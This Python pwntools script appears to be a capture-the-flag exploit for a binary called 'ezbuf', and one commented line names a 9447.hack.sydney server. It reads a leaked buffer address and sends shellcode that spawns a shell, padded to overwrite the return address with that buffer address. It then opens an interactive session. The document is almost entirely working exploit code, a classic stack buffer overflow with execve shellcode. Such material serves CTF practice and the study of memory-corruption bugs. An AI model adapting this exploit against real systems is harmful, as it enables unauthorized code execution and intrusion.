#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from struct import pack, unpack

#MAGIC_VALUE_1 = 0x475a31a5
#MAGIC_VALUE_2 = 0x40501555

shellcode="\x90\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2e\x2f\x62\x69\x68\x2f\x2e\x2f\x2e\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x10\x48\x48\x48\x48\x48\xcd\x80\x31\xc0\x40\xcd\x80"
#shellcode = "\x90\x90\x90\x90\x90"

#conn = remote("localhost", 4444) 
# conn = remote("9447.hack.sydney", 9001) 
conn = process("./ezbuf")
conn.recvuntil("\n")
recieved = conn.recvuntil("\n")
buffer_address = int(recieved[9:], 16)
log.info("Recieved: " + recieved)
log.info("Buffer is at %s" % hex(buffer_address))
#esp = buffer_address - 0x18
#log.info("ESP is: %s" % hex(esp))
#magic_value_address = esp + 0x98
#log.info("Magic value is at: %s" % hex(magic_value_address))
#log.info("Shellcode length: %s" % len(shellcode))
shellcode_address = buffer_address
#shellcode_address = shellcode_address-0xa0
log.info("Shellcode is at: %s" % hex(shellcode_address))

payload = shellcode + "A" * (9447-len(shellcode)) + str(p32(buffer_address))
# payload = "A" * 10

log.info("Sending payload")
conn.sendline(payload)
print conn.recv()
conn.interactive()
